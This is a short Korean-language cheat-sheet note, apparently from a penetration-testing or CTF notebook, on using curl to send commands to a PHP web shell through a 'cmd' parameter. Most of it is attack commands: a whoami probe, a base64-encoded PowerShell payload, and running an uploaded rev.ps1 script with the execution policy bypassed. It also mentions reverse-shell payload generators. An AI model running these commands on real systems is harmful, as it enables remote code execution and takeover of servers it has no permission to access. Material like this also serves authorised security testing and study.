# curl로 RCE 엔드포인트에 명령 전달

GET 파라미터로 시스템 명령을 넘기는 웹쉘(`?cmd=...`)에 명령을 전달하는 방법.

## 기본형

```bash
curl -G "http://target.com/shell.php" --data-urlencode "cmd=whoami"
```

- `-G` + `--data-urlencode` 조합이 정답이다. 수동 %20 치환의 한계는 query-parameters.md 참고

## PowerShell 명령 전달

```bash
# 방법 1: base64 한 토큰으로 전달 (권장)
curl -G "http://target.com/shell.php" --data-urlencode "cmd=powershell -e <UTF-16LE base64>"

# 방법 2: 스크립트 파일을 먼저 올려놓고 -File로 실행
curl -G "http://target.com/shell.php" --data-urlencode "cmd=powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\rev.ps1"
```

- 명령줄에 공백·따옴표·파이프가 섞이면 방법 1이 안전하다. base64는 특수문자가 거의 없어 URL → PHP → cmd.exe → PowerShell 해석층을 깨지지 않고 통과한다
- `-e`가 UTF-16LE base64만 받는 규칙, revshells Copy 값의 함정, 성패 판정은 windows/powershell-encodedcommand-utf16le.md 참고
